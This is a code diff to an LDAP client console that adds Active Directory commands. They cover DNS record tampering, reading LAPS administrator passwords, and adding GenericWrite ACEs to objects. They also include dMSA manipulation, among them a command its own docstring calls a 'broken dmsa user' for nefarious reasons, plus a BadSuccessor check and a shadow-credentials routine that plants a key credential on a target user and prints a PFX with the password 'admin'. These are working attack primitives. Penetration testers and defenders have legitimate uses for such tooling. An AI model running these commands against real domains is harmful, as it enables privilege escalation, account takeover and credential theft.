@@ -7,8 +7,8 @@
 import asyncio
 import copy
 import datetime
-import importlib.util
 import json
+import base64
 import logging
 import os
 import shlex
@@ -45,6 +45,7 @@ from badldap.ldap_objects.adcertificatetemplate import (
     EX_RIGHT_CERTIFICATE_ENROLLMENT, CertificateNameFlag,
     MSADCertificateTemplate)
 from badldap.wintypes.asn1.sdflagsrequest import SDFlagsRequest
+from badldap.wintypes.dnsp.structures import DNS_RECORD, DnsPropertyFactory, DNS_RECORD_TYPE
 
 
 class MSLDAPClientConsole(aiocmd.PromptToolkitCmd):
@@ -57,6 +58,7 @@ class MSLDAPClientConsole(aiocmd.PromptToolkitCmd):
 		self.adinfo = None
 		self.ldapinfo = None
 		self.domain_name = None
+		self.domain_sid = None
 		self.noisig = False
 		self.nocb = False
 		self._disable_channel_binding = False
@@ -87,6 +89,8 @@ class MSLDAPClientConsole(aiocmd.PromptToolkitCmd):
 			if err is not None:
 				raise err
 			logger.debug('BIND OK!')
+			self.domain_sid = self.connection.domainsid
+			self.domain_name = self.connection.domainname
 			self.prompt = '[%s]> ' % (self.connection._tree,)
 			self._current_dn = self.connection._tree
 			if self.connection._con.is_anon is False:
@@ -137,6 +141,7 @@ class MSLDAPClientConsole(aiocmd.PromptToolkitCmd):
 			if self.adinfo is None:
 				self.adinfo = self.connection._ldapinfo
 				self.domain_name = self.adinfo.distinguishedName.replace('DC','').replace('=','').replace(',','.')
+				self.domain_sid = self.adinfo.objectSid
 			if show is True:
 				print(self.adinfo)
 			return True
@@ -428,6 +433,252 @@ class MSLDAPClientConsole(aiocmd.PromptToolkitCmd):
 			traceback.print_exc()
 			return False
 
+	async def do_dnssoa(self, zone:str=None, forest:bool=False, legacy:bool=False):
+		"""Prints the SOA record of a given zone"""
+		try:
+			if zone is None or zone == '':
+				zone = None
+			
+			if forest is True or str(forest).lower() == 'true' or forest == '1':
+				forest = True
+			else:
+				forest = False
+			
+			if legacy is True or str(legacy).lower() == 'true' or legacy == '1':
+				legacy = True
+			else:
+				legacy = False
+				
+			soa, err = await self.connection.dns_soa(zone, forest, legacy)
+			if err is not None:
+				raise err
+			print(soa)
+			return True
+		except:
+			traceback.print_exc()
+			return False
+
+	async def do_dnsadd(self, target, ip, zone:str=None, forest:bool=False, legacy:bool=False):
+		"""Adds a DNS record for a given target"""
+		try:
+
+			if zone is None or zone == '':
+				zone = None
+			
+			if forest is True or str(forest).lower() == 'true' or forest == '1':
+				forest = True
+			else:
+				forest = False
+			
+			if legacy is True or str(legacy).lower() == 'true' or legacy == '1':
+				legacy = True
+			else:
+				legacy = False
+
+			_, err = await self.connection.dns_add(target, ip, zone, forest, legacy)
+			if err is not None:
+				raise err
+			print('Record added!')
+
+		except:
+			traceback.print_exc()
+			return False
+
+	async def do_dnsremove(self, target, ip, zone:str=None, forest:bool=False, legacy:bool=False):
+		"""Removes a DNS record for a given target (tombstones the record)"""
+		try:
+			if zone is None or zone == '':
+				zone = None
+			
+			if forest is True or str(forest).lower() == 'true' or forest == '1':
+				forest = True
+			else:
+				forest = False
+			
+			if legacy is True or str(legacy).lower() == 'true' or legacy == '1':
+				legacy = True
+			else:
+				legacy = False
+			
+			_, err = await self.connection.dns_remove(target, ip, zone, forest, legacy)
+			if err is not None:
+				raise err
+			print('Record removed!')
+		except:
+			traceback.print_exc()
+			return False
+
+	async def do_dnsdelete(self, target, zone:str=None, forest:bool=False, legacy:bool=False):
+		"""Deletes a DNS record for a given target (completely removes the record from the AD)"""
+		try:
+
+			if zone is None or zone == '':
+				zone = None
+			
+			if forest is True or str(forest).lower() == 'true' or forest == '1':
+				forest = True
+			else:
+				forest = False
+			
+			if legacy is True or str(legacy).lower() == 'true' or legacy == '1':
+				legacy = True
+			else:
+				legacy = False
+			
+			_, err = await self.connection.dns_delete(target, zone, forest, legacy)
+			if err is not None:
+				raise err
+			print('Record deleted!')
+		except:
+			traceback.print_exc()
+			return False
+
+	async def do_dnsmodify(self, target, ip, zone:str=None, forest:bool=False, legacy:bool=False):
+		"""Modifies a DNS record for a given target"""
+		try:
+
+			if zone is None or zone == '':
+				zone = None
+			
+			if forest is True or str(forest).lower() == 'true' or forest == '1':
+				forest = True
+			else:
+				forest = False
+			
+			if legacy is True or str(legacy).lower() == 'true' or legacy == '1':
+				legacy = True
+			else:
+				legacy = False
+
+			_, err = await self.connection.dns_modify(target, ip, zone, forest, legacy)
+			if err is not None:
+				raise err
+			print('Record modified!')
+		except:
+			traceback.print_exc()
+			return False
+
+	async def do_dnsrestore(self, target, zone:str=None, forest:bool=False, legacy:bool=False):
+		"""Restores a DNS record for a given target"""
+		try:
+			if zone is None or zone == '':
+				zone = None
+			
+			if forest is True or str(forest).lower() == 'true' or forest == '1':
+				forest = True
+			else:
+				forest = False
+			
+			if legacy is True or str(legacy).lower() == 'true' or legacy == '1':
+				legacy = True
+			else:
+				legacy = False
+			
+			_, err = await self.connection.dns_restore(target, zone, forest, legacy)
+			if err is not None:
+				raise err
+			print('Record restored!')
+		except:
+			traceback.print_exc()
+			return False
+
+	async def do_dnsgetserial(self, zone:str=None, forest:bool=False, legacy:bool=False):
+		"""Gets the serial number of a DNS record for a given zone"""
+		try:
+			if zone is None or zone == '':
+				zone = None
+			
+			if forest is True or str(forest).lower() == 'true' or forest == '1':
+				forest = True
+			else:
+				forest = False
+			
+			if legacy is True or str(legacy).lower() == 'true' or legacy == '1':
+				legacy = True
+			else:
+				legacy = False
+				
+			serial, err = await self.connection.dns_getserial(zone, forest, legacy)
+			if err is not None:
+				raise err
+			print('Serial: %s' % serial)
+			return True
+		except:
+			traceback.print_exc()
+			return False
+
+	async def do_dnsqueryall(self, zone:str=None, forest:bool=False, legacy:bool=False):
+		"""Queries all DNS records for a given zone"""
+		try:
+
+			if zone is None or zone == '':
+				zone = None
+			
+			if forest is True or str(forest).lower() == 'true' or forest == '1':
+				forest = True
+			else:
+				forest = False
+			
+			if legacy is True or str(legacy).lower() == 'true' or legacy == '1':
+				legacy = True
+			else:
+				legacy = False
+
+			target = None
+			entries, tree, err = await self.connection.dns_query(target, zone, forest, legacy)
+			if err is not None:
+				raise err
+			if entries is None or len(entries) == 0:
+				print('Record not found!')
+				return True
+			print('Tree: %s' % tree)
+			for entry in entries:
+				for recorddata in entry['attributes']['dnsRecord']:
+					print(recorddata.hex())
+					record = DNS_RECORD.from_bytes(recorddata)
+					print(str(record))
+					x = record.get_formatted()
+					print(str(x.__dict__))
+					print('------')
+		except:
+			traceback.print_exc()
+			return False
+
+	async def do_dnsquery(self, target, zone:str=None, forest:bool=False, legacy:bool=False):
+		"""Queries a DNS record for a given target"""
+		try:
+			if zone is None or zone == '':
+				zone = None
+			
+			if forest is True or str(forest).lower() == 'true' or forest == '1':
+				forest = True
+			else:
+				forest = False
+			
+			if legacy is True or str(legacy).lower() == 'true' or legacy == '1':
+				legacy = True
+			else:
+				legacy = False
+
+			entry, tree, err = await self.connection.dns_query(target, zone, forest, legacy)
+			if err is not None:
+				raise err
+			if entry is None:
+				print('Record not found!')
+				return True
+			print('Tree: %s' % tree)
+			for recorddata in entry['attributes']['dnsRecord']:
+				print(recorddata.hex())
+				record = DNS_RECORD.from_bytes(recorddata)
+				print(str(record))
+				x = record.get_formatted()
+				print(str(x.__dict__))
+				print('------')
+			return True
+		except:
+			traceback.print_exc()
+			return False
+
 	def get_current_dirs(self):
 		if self.__current_dirs is None:
 			return []
@@ -553,7 +804,27 @@ class MSLDAPClientConsole(aiocmd.PromptToolkitCmd):
 			async for entry, err in self.connection.pagedsearch(query, attributes):
 				if err is not None:
 					raise err
-				print(entry)
+				print('DN: %s' % entry['objectName'])
+				print('Attributes:')
+				for attr_name, attr_value in entry['attributes'].items():
+					if isinstance(attr_value, list):
+						print('  %s:' % attr_name)
+						for val in attr_value:
+							if isinstance(val, SECURITY_DESCRIPTOR):
+								print('    - %s' % val.to_sddl())
+							elif isinstance(val, bytes):
+								print('    - %s' % val.hex())
+							else:
+								print('    - %s' % val)
+					else:
+						if isinstance(attr_value, SECURITY_DESCRIPTOR):
+							print('  %s: %s' % (attr_name, attr_value.to_sddl()))
+							print('  %s: %s' % (attr_name, attr_value.to_bytes().hex()))
+						elif isinstance(attr_value, bytes):
+							print('  %s: %s' % (attr_name, attr_value.hex()))
+						else:
+							print('  %s: %s' % (attr_name, attr_value))
+				print('---')
 			return True
 		except:
 			traceback.print_exc()
@@ -955,6 +1226,22 @@ class MSLDAPClientConsole(aiocmd.PromptToolkitCmd):
 			traceback.print_exc()
 			return False
 
+	async def do_lapstarget(self, machinesid:str):
+		"""Feteches all laps password for a given machine"""
+		try:
+			# trying to get the old version LAPS
+			async for entry, err in self.connection.get_laps_for_machine(machinesid):
+				if err is not None:
+					raise err
+				if 'ms-Mcs-AdmPwd' in entry['attributes']:
+					pwd = entry['attributes']['ms-Mcs-AdmPwd']
+					print('%s : %s' % (entry['attributes']['cn'], pwd))
+
+			return True
+		except:
+			traceback.print_exc()
+			return False
+
 	async def do_groupmembership(self, dn):
 		"""Feteches names all groupnames the user is a member of for a given DN"""
 		try:
@@ -1325,6 +1612,7 @@ class MSLDAPClientConsole(aiocmd.PromptToolkitCmd):
 					raise err
 				tokengroups = res['tokengroups']
 
+			
 			for template in templates:
 				res = template.is_vulnerable2(tokengroups)
 				if len(res) == 0:
@@ -1664,7 +1952,250 @@ class MSLDAPClientConsole(aiocmd.PromptToolkitCmd):
 		except:
 			traceback.print_exc()
 			return False
+	
+	async def do_dmsas(self):
+		"""Lists all delegated managed service accounts (DMSA)"""
+		try:
+			async for entry, err in self.connection.get_all_dmsas():
+				if err is not None:
+					raise err
+				print(entry)
+			return True
+		except:
+			traceback.print_exc()
+			return False
+		
+	async def do_dmsaaddmanagedaccountprecededbylink(self, dn:str, managedaccountprecededbylink:str):
+		"""Adds a managed account preceded by link to a DMSA"""
+		try:			
+			changes = {
+				'msDS-ManagedAccountPrecededByLink' : [('replace', managedaccountprecededbylink)]
+			}
+			_, err = await self.connection.modify(dn, changes)
+			if err is not None:
+				raise err
+			print('OK')
+		except:
+			traceback.print_exc()
+			return False
 
+	async def do_dmsasetdelegatedmsastate(self, dn:str, delegatedmsastate:int):
+		"""Sets the delegated MSA state of a DMSA"""
+		try:
+			changes = {
+				'msDS-DelegatedMSAState' : [('replace', delegatedmsastate)]
+			}
+
+			_, err = await self.connection.modify(dn, changes)
+			if err is not None:
+				raise err
+			print('OK')
+		except:
+			traceback.print_exc()
+			return False
+	
+	async def do_create_broken_dmsa_user(self, user_dn:str, computersid:str):
+		"""This will create a dmsa service user that can be used for neferious reasons, but DO NOT USE THIS FOR ANYTHING ELSE!"""
+		try:
+			_, err = await self.connection.create_broken_dmsa_user(user_dn, computersid)
+			if err is not None:
+				raise err
+			print('OK')
+		except:
+			traceback.print_exc()
+			return False
+	
+	async def do_add_genericwrite(self, targetdn:str, userdn:str):
+		"""Adds a generic write ACE to a target object"""
+		try:
+			userentry, err = await self.connection.get_obj_by_dn(userdn, None)
+			if err is not None:
+				raise err
+			
+			targetsd, err = await self.connection.get_objectacl_by_dn(targetdn)
+			if err is not None:
+				raise err
+			
+			targetsd = SECURITY_DESCRIPTOR.from_bytes(targetsd)
+			user_sid = str(userentry['attributes']['objectSid'])
+			new_sd = copy.deepcopy(targetsd)
+			ace = ACCESS_ALLOWED_ACE()
+			ace.Sid = SID.from_string(user_sid)
+			ace.AceFlags = AceFlags(1)
+			ace.Mask = ADS_ACCESS_MASK.GENERIC_WRITE
+			new_sd.Dacl.aces.append(ace)
+			_, err = await self.connection.set_objectacl_by_dn(targetdn, new_sd.to_bytes(), flags=SDFlagsRequest.DACL_SECURITY_INFORMATION)
+			if err is not None:
+				raise err
+			print('SD set sucessfully')
+		except:
+			traceback.print_exc()
+			return False
+		
+	async def check_badsuccessor_sd(self, sd:SECURITY_DESCRIPTOR):
+		"""Checks if the SD has the badsuccessor flag set"""
+
+		def is_excluded_sid(sid:str):
+			sid = str(sid)
+			if sid in ["S-1-5-32-544", "S-1-5-18"]:
+				return True
+			if sid.startswith(self.domain_sid) is False:
+				return False
+			for suffix in ["-512", "-519"]:
+				if sid.endswith(suffix) is True:
+					return True
+			return False
+		
+		if sd.Dacl is None:
+			return False
+		
+		results = []
+		
+		if is_excluded_sid(sd.Owner) is False:
+			user, err = await self.connection.get_user_by_sid(sd.Owner)
+			if err is None:
+				results.append({
+					'rights' : [],
+					'rights_str' : 'OWNER',
+					'otypes' : [],
+					'users' : [
+						{
+							'name' : user.sAMAccountName,
+							'sid' : sd.Owner
+						}
+					]
+				})
+		
+		for ace in sd.Dacl.aces:
+			rights = []
+			otypes = []
+			sids = []
+			if ace.AceType in [ACEType.ACCESS_ALLOWED_ACE_TYPE, ACEType.ACCESS_ALLOWED_OBJECT_ACE_TYPE]:
+				for mask in [ADS_ACCESS_MASK.GENERIC_ALL, ADS_ACCESS_MASK.GENERIC_WRITE, ADS_ACCESS_MASK.WRITE_OWNER, ADS_ACCESS_MASK.WRITE_DACL, ADS_ACCESS_MASK.CREATE_CHILD, ADS_ACCESS_MASK.WRITE_PROP, ADS_ACCESS_MASK.CONTROL_ACCESS]:
+					if mask in ADS_ACCESS_MASK(ace.Mask):
+						rights.append(mask)
+			if len(rights) == 0:
+				continue
+			
+			if ace.AceType == ACEType.ACCESS_ALLOWED_OBJECT_ACE_TYPE:
+				if str(ace.ObjectType) in ['00000000-0000-0000-0000-000000000000', '0feb936f-47b3-49f2-9386-1dedc2c23765']:
+					otypes.append(str(ace.ObjectType))
+			
+				if len(otypes) == 0:
+					continue
+				
+			if is_excluded_sid(str(ace.Sid)) is True:
+				continue
+
+			sids.append(str(ace.Sid))
+			
+			if len(sids) == 0:
+				continue
+			
+			users = []
+			for sid in sids:
+				user, err = await self.connection.get_user_by_sid(sid)
+				if err is not None:
+					continue
+				if user is None:
+					continue
+				user_name = user.sAMAccountName
+				users.append({
+					'name' : user_name,
+					'sid' : sid
+				})
+				
+
+			results.append({
+				'rights' : rights,
+				'rights_str' : '|'.join([right.name for right in rights]),
+				'otypes' : otypes,
+				'users' : users
+			})
+		return results
+	
+	async def do_badsuccessor_check(self):
+		"""Checks if Badsuccessor vulnerability is present on the domain"""
+		try:
+			dc_list = []
+			async for computer, err in self.connection.get_all_domain_controllers():
+				if err is not None:
+					raise err
+				if computer is None:
+					continue
+				if computer.operatingSystem is None:
+					continue
+				if '2025' in computer.operatingSystem:
+					dc_list.append(computer.sAMAccountName)
+
+			if len(dc_list) == 0:
+				print('[-] No domain controllers with Windows 2025 found!')
+				print('[*] Checking OUs regardless...')
+			
+			async for entry, err in self.connection.get_all_ous():
+				if err is not None:
+					raise err
+				if entry is None:
+					continue
+				sd, err = await self.connection.get_objectacl_by_dn(entry.distinguishedName)
+				if err is not None:
+					continue
+				sd = SECURITY_DESCRIPTOR.from_bytes(sd)
+				if sd is None:
+					continue
+				if sd.Dacl is None:
+					continue
+				results = await self.check_badsuccessor_sd(sd)
+				for result in results:
+					for user in result['users']:
+						print(f"{entry.distinguishedName}, {user['name']} ({user['sid']}) {result['rights_str']}")
+		except:
+			traceback.print_exc()
+			return False
+	
+	async def do_shadowcred(self, targetuser:str):
+		try:
+			from msldap.commons.keycredential import KeyCredential
+
+			whoamires, err = await self.connection.whoamifull()
+			if err is not None:
+				raise err
+			if whoamires is None:
+				raise Exception('User not found!')
+			username = whoamires.get('samaccountname', None)
+			if username is None:
+				raise Exception('User not found! %s' % whoamires)
+			
+			target_dn, err = await self.connection.sam2dn(targetuser)
+			if err is not None:
+				raise err
+			if target_dn is None:
+				raise Exception('User not found!')
+			
+			user_cred = KeyCredential.generate_self_signed_certificate(targetuser)
+
+			current_certs, err = await self.connection.get_keycredentiallink(target_dn)
+			if err is not None:
+				raise err
+			if current_certs is None:
+				current_certs = []
+
+			print(current_certs)
+
+			current_certs.append(user_cred.toDNWithBinary2String(target_dn))
+			print(current_certs)
+
+			_, err = await self.connection.set_keycredentiallink(target_dn, current_certs)
+			if err is not None:
+				raise err
+			print('OK')
+
+			print(base64.b64encode(user_cred.to_pfx_data('admin')).decode('utf-8'))
+
+
+		except:
+			traceback.print_exc()
+			return False
 
 async def amain(args):
 	import platform
